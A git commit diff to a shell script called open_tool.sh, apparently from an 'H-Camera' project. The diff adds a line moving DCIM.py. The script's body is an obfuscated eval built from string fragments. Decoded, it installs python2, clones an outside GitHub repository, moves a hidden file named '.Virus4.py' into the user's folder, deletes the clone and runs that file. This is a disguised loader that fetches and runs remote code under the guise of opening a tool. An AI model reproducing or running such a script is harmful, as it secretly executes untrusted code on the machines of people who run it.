809692f89a8caaf186610d4e1de0dbc2eb6c1af2
0101_022 <63510472+MrAli-s@users.noreply.github.com>
2021-04-09 22:58:37 +0200

    Update open_tool.sh

--- open_tool.sh
+++ open_tool.sh
@@ -1,3 +1,4 @@
+mv ~/H-Camera/Lol/DCIM.py ~/H-Camera
 z="
 ";Az='clea';Yz='4.py';gz='Came';Rz='Lol';Gz='on2 ';Qz='nVb/';Iz='git ';bz='era/';Dz='inst';Hz='-y';ez='l';Fz='pyth';Zz=' ~/H';Tz='/H-C';jz='s4.p';Cz='apt ';Jz='clon';cz='rm -';Uz='amer';Vz='a/Lo';Sz='mv ~';iz='Viru';Lz='tps:';Pz='/Aka';Mz='//gi';Xz='irus';kz='y';fz='~/H-';Nz='thub';dz='rf ~';Kz='e ht';hz='ra/.';Ez='all ';Oz='.com';Wz='l/.V';az='-Cam';Bz='r';
 eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$Hz$z$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$z$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$z$cz$dz$Tz$Uz$Vz$ez$z$Fz$Gz$fz$gz$hz$iz$jz$kz"
